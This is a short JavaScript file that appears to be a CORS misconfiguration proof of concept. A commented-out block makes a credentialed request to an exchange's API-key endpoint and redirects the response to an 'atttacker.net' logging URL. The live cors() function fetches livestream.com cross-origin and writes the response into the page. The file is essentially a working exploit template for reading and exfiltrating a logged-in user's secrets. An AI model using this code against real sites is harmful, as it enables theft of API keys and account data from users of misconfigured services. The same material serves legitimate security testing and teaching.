/*
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://btc-exchange/api/requestApiKey',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText;
};
*/

function cors() {
  var xhr = new XMLHttpRequest();
  document.getElementById("report").innerHTML = "Sadeg";
  xhr.onreadystatechange = function() {
    if (this.status == 200) {
      document.getElementById("report").innerHTML = this.responseText;
    }
  };
  xhr.open("GET", "https://livestream.com/", true);
  //xhr.withCredentials = true;
  xhr.send();
}
